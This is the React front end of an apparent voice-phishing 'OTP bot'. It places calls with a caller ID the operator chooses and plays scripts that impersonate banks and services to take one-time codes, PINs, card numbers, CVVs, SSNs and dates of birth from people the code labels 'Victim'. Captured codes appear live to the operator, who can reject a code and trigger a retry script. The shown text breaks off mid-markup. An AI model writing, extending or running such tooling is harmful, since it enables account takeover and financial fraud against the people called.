import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Textarea } from '../components/ui/textarea';
import { Badge } from '../components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '../components/ui/tabs';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
import { ScrollArea } from '../components/ui/scroll-area';
import { 
    Phone, 
    PhoneCall,
    PhoneOff,
    CheckCircle2,
    XCircle,
    Play,
    Pause,
    Copy,
    Download,
    Settings,
    Terminal,
    User,
    Shield,
    Hash,
    Volume2,
    Send,
    TrendingUp,
    Clock,
    Mail,
    Key
} from 'lucide-react';
import { toast } from 'sonner';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const VOICE_MODELS = [
    // Infobip Voices
    { value: 'Joanna', label: 'Joanna (US English Female)', provider: 'infobip' },
    { value: 'Matthew', label: 'Matthew (US English Male)', provider: 'infobip' },
    { value: 'Amy', label: 'Amy (UK English Female)', provider: 'infobip' },
    { value: 'Brian', label: 'Brian (UK English Male)', provider: 'infobip' },
    
    // ElevenLabs Voices - Free Tier
    { value: 'Rachel', label: 'Rachel (US Female, Calm)', provider: 'elevenlabs' },
    { value: 'Adam', label: 'Adam (US Male, Deep)', provider: 'elevenlabs' },
    { value: 'Bella', label: 'Bella (US Female, Young)', provider: 'elevenlabs' },
    { value: 'Antoni', label: 'Antoni (US Male, Smooth)', provider: 'elevenlabs' },
    { value: 'Elli', label: 'Elli (US Female, Energetic)', provider: 'elevenlabs' },
    { value: 'Josh', label: 'Josh (US Male, Young)', provider: 'elevenlabs' },
    { value: 'Arnold', label: 'Arnold (US Male, Strong)', provider: 'elevenlabs' },
    { value: 'Domi', label: 'Domi (US Female, Confident)', provider: 'elevenlabs' },
    { value: 'Dave', label: 'Dave (UK Male, Professional)', provider: 'elevenlabs' },
    { value: 'Fin', label: 'Fin (Irish Male, Friendly)', provider: 'elevenlabs' },
    { value: 'Sarah', label: 'Sarah (US Female, Soft)', provider: 'elevenlabs' },
    { value: 'Nicole', label: 'Nicole (US Female, Warm)', provider: 'elevenlabs' },
    { value: 'Jessie', label: 'Jessie (US Female, Clear)', provider: 'elevenlabs' },
    { value: 'Ryan', label: 'Ryan (US Male, Natural)', provider: 'elevenlabs' },
    { value: 'Sam', label: 'Sam (US Male, Dynamic)', provider: 'elevenlabs' },
    { value: 'Glinda', label: 'Glinda (US Female, Witch-like)', provider: 'elevenlabs' },
    { value: 'Mimi', label: 'Mimi (Swedish Female)', provider: 'elevenlabs' },
    { value: 'Freya', label: 'Freya (US Female, Mature)', provider: 'elevenlabs' },
    { value: 'Grace', label: 'Grace (US Female, Southern)', provider: 'elevenlabs' },
    { value: 'Daniel', label: 'Daniel (UK Male, Deep)', provider: 'elevenlabs' },
    { value: 'Lily', label: 'Lily (UK Female, Raspy)', provider: 'elevenlabs' },
    { value: 'Serena', label: 'Serena (US Female, Pleasant)', provider: 'elevenlabs' },
    { value: 'Emily', label: 'Emily (US Female, Calm)', provider: 'elevenlabs' },
    { value: 'Charlotte', label: 'Charlotte (Swedish Female, Seductive)', provider: 'elevenlabs' },
    { value: 'Alice', label: 'Alice (UK Female, Confident)', provider: 'elevenlabs' },
    { value: 'Matilda', label: 'Matilda (US Female, Warm)', provider: 'elevenlabs' },
    { value: 'James', label: 'James (Australian Male)', provider: 'elevenlabs' },
    { value: 'Joseph', label: 'Joseph (UK Male, Mature)', provider: 'elevenlabs' },
    { value: 'Jeremy', label: 'Jeremy (Irish Male, Excited)', provider: 'elevenlabs' },
    { value: 'Michael', label: 'Michael (US Male, Authoritative)', provider: 'elevenlabs' },
    { value: 'Ethan', label: 'Ethan (US Male, ASMR)', provider: 'elevenlabs' },
    { value: 'Chris', label: 'Chris (US Male, Casual)', provider: 'elevenlabs' },
    { value: 'Gigi', label: 'Gigi (US Female, Childish)', provider: 'elevenlabs' },
    { value: 'Thomas', label: 'Thomas (US Male, Calm)', provider: 'elevenlabs' },
    { value: 'Charlie', label: 'Charlie (Australian Male, Casual)', provider: 'elevenlabs' },
    { value: 'George', label: 'George (UK Male, Raspy)', provider: 'elevenlabs' },
    { value: 'Callum', label: 'Callum (US Male, Hoarse)', provider: 'elevenlabs' },
    { value: 'Patrick', label: 'Patrick (US Male, Shouty)', provider: 'elevenlabs' },
    { value: 'Harry', label: 'Harry (US Male, Anxious)', provider: 'elevenlabs' },
    { value: 'Liam', label: 'Liam (US Male, Articulate)', provider: 'elevenlabs' },
    { value: 'Dorothy', label: 'Dorothy (UK Female, Pleasant)', provider: 'elevenlabs' },
    { value: 'Bill', label: 'Bill (US Male, Strong)', provider: 'elevenlabs' },
    
    // Deepgram Voices
    { value: 'aura-asteria-en', label: 'Asteria (Female, Clear)', provider: 'deepgram' },
    { value: 'aura-luna-en', label: 'Luna (Female, Warm)', provider: 'deepgram' },
    { value: 'aura-stella-en', label: 'Stella (Female, Bright)', provider: 'deepgram' },
    { value: 'aura-athena-en', label: 'Athena (Female, Authoritative)', provider: 'deepgram' },
    { value: 'aura-hera-en', label: 'Hera (Female, Mature)', provider: 'deepgram' },
    { value: 'aura-2-andromeda-en', label: 'Andromeda (Female, American)', provider: 'deepgram' },
    { value: 'aura-orion-en', label: 'Orion (Male, Deep)', provider: 'deepgram' },
    { value: 'aura-arcas-en', label: 'Arcas (Male, Professional)', provider: 'deepgram' },
    { value: 'aura-perseus-en', label: 'Perseus (Male, Confident)', provider: 'deepgram' },
    { value: 'aura-angus-en', label: 'Angus (Male, Friendly)', provider: 'deepgram' },
    { value: 'aura-orpheus-en', label: 'Orpheus (Male, Smooth)', provider: 'deepgram' },
    { value: 'aura-helios-en', label: 'Helios (Male, Energetic)', provider: 'deepgram' },
    { value: 'aura-zeus-en', label: 'Zeus (Male, Authoritative)', provider: 'deepgram' },
];

const CALL_TYPES = [
    { value: 'login_verification', label: 'Login Verification' },
    { value: 'account_recovery', label: 'Account Recovery' },
    { value: 'service_verification', label: 'Service Verification' },
    { value: 'pin_request', label: 'PIN Request' },
    { value: 'password_change', label: 'Password Change' },
    { value: 'payment_authorize', label: 'Payment Authorization' },
    { value: 'security_alert', label: 'Security Alert' },
    { value: 'bank_verification', label: 'Bank Verification' },
    { value: 'card_cvv_request', label: 'Card CVV Request' },
];

const CALL_TEMPLATES = {
    'account_recovery': {
        step1_message: 'Hello {name}. You have requested recovery for your {service} account. Press 1 to verify your identity and continue the recovery process. Press 0 to discontinue.',
        step2_message: 'To verify your identity, please enter the {digits} digit verification code that was sent to your registered contact information.',
        step3_message: 'Please wait while we verify your information.',
        accepted_message: 'Thank you {name}. Your identity has been verified successfully. Your account recovery process will continue. You will receive further instructions shortly.',
        rejected_message: 'The verification code is incorrect. Please check the code sent to your device and enter the correct {digits} digit code.'
    },
    'login_verification': {
        step1_message: 'Hello {name}. We have detected a login attempt to your {service} account from a new device or location. If you did not recognize this request, please press 1. If this was you, press 0 to approve.',
        step2_message: 'To Verification, please enter the {digits} digit security code that was just sent to your registered mobile number.',
        step3_message: 'Thank you. Please hold for a moment while we verify your code.',
        accepted_message: 'Thank you for waiting. We will get back to you if we need further information. Thank you for your attention, good bye.',
        rejected_message: 'Thank you for waiting. The verification code you entered previously is incorrect. Please check your device and enter the correct {digits} digit code.'
    },
    'service_verification': {
        step1_message: 'Hello {name}. This is {service}. We need to verify your account information for security purposes. Press 1 to continue the verification process. Press 0 to discontinue.',
        step2_message: 'Please enter the {digits} digit verification code that we have sent to your registered contact information to confirm your account ownership.',
        step3_message: 'Please wait while we verify your account.',
        accepted_message: 'Thank you {name}. Your account has been verified successfully. Your {service} account is now fully secure and updated.',
        rejected_message: 'The verification code is incorrect. Please enter the correct {digits} digit code that was sent to you.'
    },
    'pin_request': {
        step1_message: 'Hello {name}. This is the {service} security department. We\'ve detected unusual activity on your account. Press 1 to verify your identity with your PIN. Press 0 to refuse to verify your identity.',
        step2_message: 'For security verification, please enter your {digits} digit PIN number now.',
        step3_message: 'Please wait while we verify your PIN.',
        accepted_message: 'Thank you {name}. Your PIN has been verified successfully. Your account is now secure.',
        rejected_message: 'The PIN number you entered is incorrect. Please carefully enter your correct {digits} digit PIN.'
    },
    'password_change': {
        step1_message: 'Hello {name}, this is the security department from your {service} account. We\'ve received a request to change your account password. If you did not request a password change, press 1 to block this action. If you requested this change, press 0 to confirm.',
        step2_message: 'Thank you. To secure your account, please enter the {digits}-digit verification code we\'ve just sent to your registered mobile device.',
        step3_message: 'Please wait while we verify your code.',
        accepted_message: 'Your code has been verified. Your {service} account will remain protected. Thank you for confirming your security.',
        rejected_message: 'The verification code is incorrect. Please check the code sent to your device and enter the correct {digits} digit code.'
    },
    'payment_authorize': {
        step1_message: 'Hello {name}. This is {service} contacting you regarding a payment authorization request on your account. Press 1 to review and authorize this transaction. Press 0 to decline this transaction.',
        step2_message: 'A payment transaction requires your authorization. Please enter the {digits} digit authorization code that was sent to your registered mobile number to approve this transaction.',
        step3_message: 'Please hold while we process your authorization.',
        accepted_message: 'Thank you {name}. Your authorization has been confirmed. The transaction will be processed. You will receive a confirmation shortly.',
        rejected_message: 'The authorization code you entered is invalid. Please enter the correct {digits} digit code to authorize this transaction.'
    },
    'security_alert': {
        step1_message: 'Attention {name}. This is an urgent security alert from {service}. We\'ve detected suspicious activity on your account. Press 1 immediately to verify your identity and secure your account. Press 0 to cancel identity verification.',
        step2_message: 'To confirm your identity and secure your account, please enter the {digits} digit emergency security code that was sent to your registered number.',
        step3_message: 'Please hold while we verify your security code.',
        accepted_message: 'Thank you {name}. Your identity has been confirmed. We are taking immediate action to secure your account. You will receive a detailed security report shortly.',
        rejected_message: 'The security code is incorrect. This is urgent. Please enter the correct {digits} digit code to secure your account.'
    },
    'bank_verification': {
        step1_message: 'Hello {name}. This is an urgent security verification from {bank_name}. We have detected unusual activity on your {card_type} card ending in {ending_card}. Press 1 to continue verification. Press 0 to block',
        step2_message: 'For the security of your {bank_name} {card_type} card ending in {ending_card}, please enter the {digits} digit verification code that was just sent to your registered mobile number.',
        step3_message: 'Your code is being verified. Please wait.',
        accepted_message: 'Thank you {name}. Your {bank_name} {card_type} card ending in {ending_card} has been verified and secured. Have a great day.',
        rejected_message: 'The verification code you entered is incorrect. Please listen carefully and enter the correct {digits} digit code for your {card_type} card ending in {ending_card}.'
    },
    'card_cvv_request': {
        step1_message: 'Hello {name}. This is {bank_name} fraud prevention calling. We have detected suspicious activity on your {card_type} card ending in {ending_card}. Press 1 to verify your card information immediately.',
        step2_message: 'To verify your {card_type} card ownership, please enter your {digits} digit card number followed by the pound key.',
        step3_message: 'Please hold while we verify your card information.',
        accepted_message: 'Thank you {name}. Your {bank_name} {card_type} card ending in {ending_card} has been verified and secured. We are taking action to protect your account.',
        rejected_message: 'The card information you entered appears to be incorrect. Please carefully re-enter your {card_type} card number and CVV for the card ending in {ending_card}.'
    }
};

const OTPBotPage = () => {
    const [socket, setSocket] = useState(null);
    const [logs, setLogs] = useState([]);
    const [sessionId, setSessionId] = useState(null);
    const [callId, setCallId] = useState(null);
    const [sessionStatus, setSessionStatus] = useState(null);
    const [otpReceived, setOtpReceived] = useState(null);
    const [amdResult, setAmdResult] = useState(null);
    const [callDuration, setCallDuration] = useState(0);
    const [recordingUrl, setRecordingUrl] = useState(null);
    const [isPlaying, setIsPlaying] = useState(false);
    const [isCallActive, setIsCallActive] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [currentStep, setCurrentStep] = useState(0);
    const logsEndRef = useRef(null);
    const audioRef = useRef(null);
    const durationInterval = useRef(null);

    // Form state
    const [config, setConfig] = useState({
        recipient_number: '',
        caller_id: '',
        recipient_name: '',
        service_name: 'Account',
        bank_name: '',
        card_type: 'Visa',
        ending_card: '',
        otp_digits: 6,
        language: 'en',
        voice_name: 'Joanna',
        voice_provider: 'infobip',
        step1_message: 'Hello {name}. We have detected a login attempt to your {service} account from a new device or location. If you did not recognize this request, please press 1. If this was you, press 0 to approve.',
        step2_message: 'To Verification, please enter the {digits} digit security code that was just sent to your registered mobile number.',
        step3_message: 'Thank you. Please hold for a moment while we verify your code.',
        accepted_message: 'Thank you for waiting. We will get back to you if we need further information. Thank you for your attention, good bye.',
        rejected_message: 'Thank you for waiting. The verification code you entered previously is incorrect. Please check your device and enter the correct {digits} digit code.'
    });

    const [activeStep, setActiveStep] = useState('step1');
    const [selectedTemplate, setSelectedTemplate] = useState('login_verification');


    // Scroll to bottom on new logs
    useEffect(() => {
        logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [logs]);

    // Duration counter
    useEffect(() => {
        if (isCallActive) {
            durationInterval.current = setInterval(() => {
                setCallDuration(prev => prev + 1);
            }, 1000);
        } else {
            if (durationInterval.current) {
                clearInterval(durationInterval.current);
            }
        }
        return () => {
            if (durationInterval.current) {
                clearInterval(durationInterval.current);
            }
        };
    }, [isCallActive]);

    // Connect to Socket.IO on component mount (not waiting for sessionId)
    useEffect(() => {
        console.log('Connecting to Socket.IO at:', BACKEND_URL);
        const newSocket = io(BACKEND_URL, {
            transports: ['websocket', 'polling'],
            path: '/api/socket.io/',
            reconnection: true,
            reconnectionAttempts: 10,
            reconnectionDelay: 500,
        });

        newSocket.on('connect', () => {
            console.log('Socket connected, sid:', newSocket.id);
        });

        newSocket.on('connect_error', (error) => {
            console.error('Socket connection error:', error);
        });

        newSocket.on('call_log', (log) => {
            console.log('Log received:', log);
            setLogs(prev => [...prev, log]);
            
            // Play notification sound for Victim Pressed 1 or 0
            if (log.type === 'warning' && (log.message.includes('Victim Pressed 1') || log.message.includes('Victim Pressed 0'))) {
                const audio = new Audio('/notification-sound.wav');
                audio.volume = 1.0;
                audio.play().catch(err => console.log('Audio play failed:', err));
            }
            
            // Handle OTP captured
            if (log.type === 'otp' && log.data?.otp) {
                setOtpReceived(log.data.otp);
                setSessionStatus('OTP Captured');
            }
            
            // Handle AMD detection
            if (log.type === 'amd' && log.data?.result) {
                setAmdResult(log.data.result);
            }
            
            // Handle recording URL
            if (log.type === 'recording' && log.data?.fileId) {
                // Use our proxy endpoint to download the recording
                const recordingDownloadUrl = `${API}/otp/recording/download/${log.data.fileId}`;
                setRecordingUrl(recordingDownloadUrl);
            } else if (log.type === 'recording' && log.data?.url) {
                setRecordingUrl(log.data.url);
            }
            
            // Handle call completed
            if (log.type === 'info' && log.message.includes('Call ended')) {
                setIsCallActive(false);
                setSessionStatus('Completed');
            }
            
            // Update status based on log type
            if (log.type === 'ringing') setSessionStatus('Ringing');
            if (log.type === 'answered') setSessionStatus('Answered');
            if (log.type === 'busy') setSessionStatus('Busy');
            if (log.type === 'no_answer') setSessionStatus('No Answer');
            if (log.type === 'rejected') setSessionStatus('Rejected');
        });

        newSocket.on('disconnect', () => {
            console.log('Socket disconnected');
        });

        setSocket(newSocket);

        return () => {
            newSocket.close();
        };
    }, []);

    // Join session when sessionId is available
    useEffect(() => {
        if (sessionId && socket && socket.connected) {
            console.log('Joining session:', sessionId);
            socket.emit('join_session', { session_id: sessionId });
        } else if (sessionId && socket) {
            // Socket exists but not connected yet, wait for connect
            socket.on('connect', () => {
                console.log('Socket connected, joining session:', sessionId);
                socket.emit('join_session', { session_id: sessionId });
            });
        }
    }, [sessionId, socket]);

    const getAuthHeaders = () => {
        const token = localStorage.getItem('token');
        return token ? { Authorization: `Bearer ${token}` } : {};
    };

    const handleCallTypeChange = (value) => {
        setSelectedTemplate(value);
        const template = CALL_TEMPLATES[value];
        if (template) {
            setConfig(prev => ({
                ...prev,
                step1_message: template.step1_message,
                step2_message: template.step2_message,
                step3_message: template.step3_message,
                accepted_message: template.accepted_message,
                rejected_message: template.rejected_message
            }));
            toast.success(`Template "${CALL_TYPES.find(t => t.value === value)?.label}" applied!`);
        }
    };


    const handleInitiateCall = async () => {
        if (!config.recipient_number || !config.caller_id) {
            toast.error('Harap isi nomor penerima dan Caller ID');
            return;
        }

        setIsLoading(true);
        setLogs([]);
        setOtpReceived(null);
        setAmdResult(null);
        setCallDuration(0);
        setRecordingUrl(null);
        setCurrentStep(1);
        setSessionStatus('Initiating');

        try {
            const response = await axios.post(`${API}/otp/initiate-call`, config, {
                headers: getAuthHeaders()
            });

            setSessionId(response.data.session_id);
            setCallId(response.data.call_id);
            setIsCallActive(true);
            setSessionStatus('Calling');
            toast.success('Call initiated!');
        } catch (error) {
            console.error('Error initiating call:', error);
            toast.error(error.response?.data?.detail || 'Failed to initiate call');
            setCurrentStep(0);
            setSessionStatus(null);
        } finally {
            setIsLoading(false);
        }
    };

    const handleAccept = async () => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/accept/${sessionId}`, {}, {
                headers: getAuthHeaders()
            });
            toast.success('OTP Accepted - Call completed!');
            setIsCallActive(false);
            setSessionStatus('Completed');
        } catch (error) {
            toast.error('Failed to accept');
        } finally {
            setIsLoading(false);
        }
    };

    const handleReject = async () => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/reject/${sessionId}`, {}, {
                headers: getAuthHeaders()
            });
            toast.info('OTP Rejected - Retry message sent');
            setOtpReceived(null);
            setSessionStatus('Waiting OTP');
        } catch (error) {
            toast.error('Failed to reject');
        } finally {
            setIsLoading(false);
        }
    };

    const handleRequestPin = async (digits) => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/request-pin/${sessionId}?digits=${digits}`, {}, {
                headers: getAuthHeaders()
            });
            toast.info(`Requesting ${digits}-digit PIN`);
        } catch (error) {
            toast.error('Failed to request PIN');
        } finally {
            setIsLoading(false);
        }
    };

    const handleRequestInfo = async (infoType) => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/request-info/${sessionId}?info_type=${infoType}`, {}, {
                headers: getAuthHeaders()
            });
            const labels = {
                'otp_email': 'Email OTP',
                'ssn': 'SSN',
                'dob': 'Date of Birth',
                'cvv': 'CVV'
            };
            toast.info(`Requesting ${labels[infoType] || infoType}`);
        } catch (error) {
            toast.error(`Failed to request ${infoType}`);
        } finally {
            setIsLoading(false);
        }
    };

    const handleHangup = async () => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/hangup/${sessionId}`, {}, {
                headers: getAuthHeaders()
            });
            toast.info('Call ended');
            setIsCallActive(false);
            setSessionStatus('Ended');
        } catch (error) {
            toast.error('Failed to hangup');
        } finally {
            setIsLoading(false);
        }
    };

    const copyLogs = () => {
        const logText = logs.map(l => `[${l.timestamp}] ${l.message}`).join('\n');
        navigator.clipboard.writeText(logText);
        toast.success('Logs copied!');
    };

    const exportLogs = () => {
        const logText = logs.map(l => `[${l.timestamp}] ${l.type.toUpperCase()}: ${l.message}`).join('\n');
        const blob = new Blob([logText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `call_log_${sessionId || 'session'}.txt`;
        a.click();
    };

    const toggleRecording = () => {
        if (audioRef.current) {
            if (isPlaying) {
                audioRef.current.pause();
            } else {
                audioRef.current.play();
            }
            setIsPlaying(!isPlaying);
        }
    };

    const formatDuration = (seconds) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}m ${secs}s`;
    };

    const getLogIcon = (type) => {
        switch (type) {
            case 'ringing': return '📞';
            case 'answered': return '🤳';
            case 'amd': return '👤';
            case 'human': return '👤';
            case 'silent': return '🔇';
            case 'voicemail': return '🤖';
            case 'busy': return '📵';
            case 'no_answer': return '📵';
            case 'rejected': return '📴';
            case 'success': return '✅';
            case 'error': return '❌';
            case 'dtmf': return '🔢';
            case 'otp': return '🔑';
            case 'call': return '📞';
            case 'step': return '🎙️';
            case 'action': return '⚡';
            case 'warning': return '⚠️';
            case 'info': return 'ℹ️';
            case 'recording': return '🎤';
            default: return '📋';
        }
    };

    const getLogColor = (type) => {
        switch (type) {
            case 'success': 
            case 'answered':
            case 'human':
                return 'text-emerald-400';
            case 'error': 
            case 'rejected':
            case 'busy':
                return 'text-red-400';
            case 'ringing':
                return 'text-blue-400';
            case 'dtmf': 
            case 'otp':
                return 'text-amber-400';
            case 'amd':
            case 'warning':
                return 'text-yellow-400';
            case 'voicemail':
                return 'text-purple-400';
            case 'recording':
                return 'text-pink-400';
            default: return 'text-gray-300';
        }
    };

    const getStatusBadge = () => {
        if (!sessionStatus) return null;
        
        const statusColors = {
            'Initiating': 'bg-blue-500/20 text-blue-400',
            'Calling': 'bg-blue-500/20 text-blue-400 animate-pulse',
            'Ringing': 'bg-yellow-500/20 text-yellow-400 animate-pulse',
            'Answered': 'bg-emerald-500/20 text-emerald-400',
            'OTP Captured': 'bg-amber-500/20 text-amber-400',
            'Completed': 'bg-emerald-500/20 text-emerald-400',
            'Busy': 'bg-red-500/20 text-red-400',
            'No Answer': 'bg-red-500/20 text-red-400',
            'Rejected': 'bg-red-500/20 text-red-400',
            'Ended': 'bg-gray-500/20 text-gray-400',
        };

        return (
            <Badge className={statusColors[sessionStatus] || 'bg-gray-500/20 text-gray-400'}>
                🔑 {sessionStatus}
            </Badge>
        );
    };

    return (
        <div className="space-y-6" data-testid="otp-bot-page">
            {/* Header */}
            <div className="flex items-center justify-between">
                <div>
                    <h1 className="text-2xl md:text-3xl font-black tracking-tight flex items-center gap-3">
                        <PhoneCall className="w-8 h-8 text-violet-400" />
                        <span>OTP <span className="text-gradient">Bot Call</span></span>
                    </h1>
                    <p className="text-gray-400 mt-1">Advanced Voice OTP Collection System</p>
                </div>
                <div className="flex items-center gap-3">
                    <Badge className={`${isCallActive ? 'bg-emerald-500/20 text-emerald-400 animate-pulse' : 'bg-gray-500/20 text-gray-400'}`}>
                        {isCallActive ? '● Active Call' : '○ No Active Call'}
                    </Badge>
                </div>
            </div>

            <div className="grid lg:grid-cols-2 gap-6">
                {/* Left Column - Configuration */}
                <div className="space-y-6">
                    {/* Call Configuration Card */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-4">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Settings className="w-5 h-5 text-violet-400" />
                                Call Configuration
                            </CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="text-xs uppercase tracking-wider text-gray-500">Call Type</Label>
                                    <Select defaultValue="login_verification" onValueChange={handleCallTypeChange}>
                                        <SelectTrigger className="bg-[#0F111A] border-white/10">
                                            <SelectValue />
                                        </SelectTrigger>
                                        <SelectContent className="bg-[#12141F] border-white/10">
                                            {CALL_TYPES.map(type => (
                                                <SelectItem key={type.value} value={type.value}>{type.label}</SelectItem>
                                            ))}
                                        </SelectContent>
                                    </Select>
                                </div>
                                <div className="space-y-2">
                                    <Label className="text-xs uppercase tracking-wider text-gray-500">Voice Model</Label>
                                    <Select 
                                        value={config.voice_name}
                                        onValueChange={(v) => {
                                            const selectedVoice = VOICE_MODELS.find(m => m.value === v);
                                            setConfig({
                                                ...config, 
                                                voice_name: v,
                                                voice_provider: selectedVoice?.provider || 'infobip'
                                            });
                                        }}
                                    >
                                        <SelectTrigger className="bg-[#0F111A] border-white/10">
                                            <SelectValue />
                                        </SelectTrigger>
                                        <SelectContent className="bg-[#12141F] border-white/10 max-h-96 overflow-y-auto">
                                            {VOICE_MODELS.map(model => (
                                                <SelectItem key={model.value} value={model.value}>{model.label}</SelectItem>
                                            ))}
                                        </SelectContent>
                                    </Select>
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Phone className="w-3 h-3" />
                                        Caller ID / From Number
                                    </Label>
                                    <Input
                                        data-testid="otp-caller-id"
                                        value={config.caller_id}
                                        onChange={(e) => setConfig({...config, caller_id: e.target.value})}
                                        placeholder="+12025551234"
                                        className="bg-[#0F111A] border-amber-500/30 font-mono"
                                        disabled={isCallActive}
                                    />
                                </div>
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <User className="w-3 h-3" />
                                        Recipient Name
                                    </Label>
                                    <Input
                                        value={config.recipient_name}
                                        onChange={(e) => setConfig({...config, recipient_name: e.target.value})}
                                        placeholder="John"
                                        className="bg-[#0F111A] border-white/10"
                                        disabled={isCallActive}
                                    />
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Phone className="w-3 h-3" />
                                        Recipient Number
                                    </Label>
                                    <Input
                                        data-testid="otp-recipient-number"
                                        value={config.recipient_number}
                                        onChange={(e) => setConfig({...config, recipient_number: e.target.value})}
                                        placeholder="+13362873517"
                                        className="bg-[#0F111A] border-white/10 font-mono"
                                        disabled={isCallActive}
                                    />
                                </div>
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Shield className="w-3 h-3" />
                                        Service Name
                                    </Label>
                                    <Input
                                        value={config.service_name}
                                        onChange={(e) => setConfig({...config, service_name: e.target.value})}
                                        placeholder="Account"
                                        className="bg-[#0F111A] border-white/10"
                                        disabled={isCallActive}
                                    />
                                </div>
                            </div>

                            {/* Additional Fields for Card/Bank Templates - Only show for bank_verification or card_cvv_request */}
                            {(selectedTemplate === 'bank_verification' || selectedTemplate === 'card_cvv_request') && (
                            <div className="p-4 bg-blue-500/5 border border-blue-500/20 rounded-lg space-y-4">
                                <div className="flex items-center gap-2 text-blue-400 text-sm font-medium">
                                    <span className="w-2 h-2 bg-blue-400 rounded-full"></span>
                                    Additional Fields for {selectedTemplate === 'bank_verification' ? 'Bank Verification' : 'Card CVV Request'}
                                </div>
                                
                                <div className="grid grid-cols-3 gap-4">
                                    <div className="space-y-2">
                                        <Label className="text-xs uppercase tracking-wider text-gray-500">
                                            Bank Name
                                        </Label>
                                        <Input
                                            value={config.bank_name}
                                            onChange={(e) => setConfig({...config, bank_name: e.target.value})}
                                            placeholder="e.g., Chase, BofA"
                                            className="bg-[#0F111A] border-white/10"
                                            disabled={isCallActive}
                                        />
                                    </div>
                                    
                                    <div className="space-y-2">
                                        <Label className="text-xs uppercase tracking-wider text-gray-500">
                                            Card Type
                                        </Label>
                                        <Select 
                                            value={config.card_type}
                                            onValueChange={(v) => setConfig({...config, card_type: v})}
                                            disabled={isCallActive}
                                        >
                                            <SelectTrigger className="bg-[#0F111A] border-white/10">
                                                <SelectValue />
                                            </SelectTrigger>
                                            <SelectContent className="bg-[#12141F] border-white/10">
                                                <SelectItem value="Visa">Visa</SelectItem>
                                                <SelectItem value="Mastercard">Mastercard</SelectItem>
                                                <SelectItem value="American Express">American Express</SelectItem>
                                                <SelectItem value="Discover">Discover</SelectItem>
                                            </SelectContent>
                                        </Select>
                                    </div>
                                    
                                    <div className="space-y-2">
                                        <Label className="text-xs uppercase tracking-wider text-gray-500">
                                            Ending Card Digits
                                        </Label>
                                        <Input
                                            value={config.ending_card}
                                            onChange={(e) => setConfig({...config, ending_card: e.target.value.replace(/\D/g, '').slice(0, 4)})}
                                            placeholder="e.g., 1234"
                                            maxLength={4}
                                            className="bg-[#0F111A] border-white/10"
                                            disabled={isCallActive}
                                        />
                                    </div>
                                </div>
                            </div>
                            )}


                            <div className="space-y-2">
                                <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                    <Hash className="w-3 h-3" />
                                    OTP Digits
                                </Label>
                                <Select 
                                    value={config.otp_digits.toString()}
                                    onValueChange={(v) => setConfig({...config, otp_digits: parseInt(v)})}
                                    disabled={isCallActive}
                                >
                                    <SelectTrigger className="bg-[#0F111A] border-white/10 w-32">
                                        <SelectValue />
                                    </SelectTrigger>
                                    <SelectContent className="bg-[#12141F] border-white/10">
                                        <SelectItem value="4">4 digits</SelectItem>
                                        <SelectItem value="5">5 digits</SelectItem>
                                        <SelectItem value="6">6 digits</SelectItem>
                                        <SelectItem value="8">8 digits</SelectItem>
                                    </SelectContent>
                                </Select>
                            </div>

                            {/* Action Button */}
                            <div className="pt-4">
                                <Button
                                    onClick={handleInitiateCall}
                                    disabled={isLoading || isCallActive}
                                    data-testid="initiate-call-btn"
                                    className="w-full bg-violet-600 hover:bg-violet-700 glow-primary"
                                >
                                    {isLoading ? (
                                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mr-2" />
                                    ) : (
                                        <Play className="w-4 h-4 mr-2" />
                                    )}
                                    {isCallActive ? 'Call in Progress' : 'Start Call'}
                                </Button>
                            </div>
                        </CardContent>
                    </Card>

                    {/* Call Steps Configuration */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-2">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Volume2 className="w-5 h-5 text-cyan-400" />
                                Call Steps Configuration
                            </CardTitle>
                        </CardHeader>
                        <CardContent>
                            <Tabs value={activeStep} onValueChange={setActiveStep}>
                                <TabsList className="grid grid-cols-5 bg-[#0F111A] mb-4">
                                    <TabsTrigger value="step1" className="text-xs data-[state=active]:bg-blue-600">Step 1</TabsTrigger>
                                    <TabsTrigger value="step2" className="text-xs data-[state=active]:bg-blue-600">Step 2</TabsTrigger>
                                    <TabsTrigger value="step3" className="text-xs data-[state=active]:bg-blue-600">Step 3</TabsTrigger>
                                    <TabsTrigger value="accepted" className="text-xs data-[state=active]:bg-emerald-600">Accepted</TabsTrigger>
